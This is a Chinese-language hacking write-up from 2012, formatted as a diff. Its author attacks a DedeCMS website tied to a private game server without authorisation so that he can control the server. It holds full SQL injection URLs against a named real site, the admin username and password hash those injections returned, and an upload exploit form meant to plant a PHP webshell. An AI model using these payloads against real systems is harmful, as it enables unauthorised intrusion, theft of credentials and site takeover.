@@ -1,0 +1,76 @@
+发布时间：2012-4.26
+
+漏洞类型：注入漏洞、上传漏洞
+
+打算玩天龙私服 找了个服打算玩 8.00的服  还是想拿下服务器 自己当GM就爽了 于是旁注一站
+
+好像有两个ip 目标站 www.956tl.com  长安刺客是显示的是  76.73.84.26
+
+可其他的旁注查询 又是 这个 76.73.84.52 是不是什么cdn加速了
+访问这个 http://www.30tianlong.com/robots.txt
+
+发现这个 http://www.30tianlong.com//plus/search.php
+
+提示：DedeCMS 提示信息！
+
+关键字不能小于2个字节！
+如果你的浏览器没反应，请点击这里...
+
+正好看到QQ好友里面有人发了dedecms oday 测试了下
+
+
+　　注入漏洞。
+
+这站
+    http://www.30tianlong.com/
+
+】、首先访问“/data/admin/ver.txt”页面获取系统最后升级时间，
+
+　 然后访问“/member/ajax_membergroup.php?action=post&membergroup=1”页面，如图说明存在该漏洞。
+
+　　然后写上语句  
+
+查看管理员帐号
+
+http://www.30tianlong.com//member/ajax_membergroup.php?action=post&membergroup=@`'`%20Union%20select%20userid%20from%20`%23@__admin`%20where%201%20or%20id=@`'`
+
+admin                 
+
+查看管理员密码
+　　http://www.30tianlong.com//member/ajax_membergroup.php?action=post&membergroup=@`'`%20Union%20select%20pwd%20from%20`%23@__admin`%20where%201%20or%20id=@
+
+8d29b1ef9f8c5a5af429
+
+查看管理员密码
+
+　　得到的是19位的，去掉前三位和最后一位，得到管理员的16位MD5
+
+8d2
+9b1ef9f8c5a5af42
+9
+
+cmd5没解出来 只好测试第二个方法
+
+
+第二个   是上传漏洞：
+
+只要登陆会员中心，然后访问页面链接
+
+　　“/plus/carbuyaction.php?dopost=memclickout&oid =S-P0RN8888&rs[code]=../dialog/select_soft_post”
+
+　　如图，说明通过“/plus/carbuyaction.php”已经成功调用了上传页面“/dialog/select_soft_post”
+
+
+　于是将Php一句话木马扩展名改为“rar”等，利用提交页面upload1.htm
+
+<form action="http://www.xxx.net/plus/carbuyaction.php?dopost=memclickout&oid=S-P0RN8888&rs[code]=../dialog/select_soft_post" method="post"
+enctype="multipart/form-data" name="form1">
+file:<input name="uploadfile" type="file" /><br>
+newname:<input name="newname" type="text" value="myfile.Php"/>
+<button class="button2" type="submit">提交</button><br><br>
+
+
+测试了下上传代码好像有问题  
+
+
+图的演示  http://www.yunsec.net/a/security/bugs/script/2012/0426/10574.html
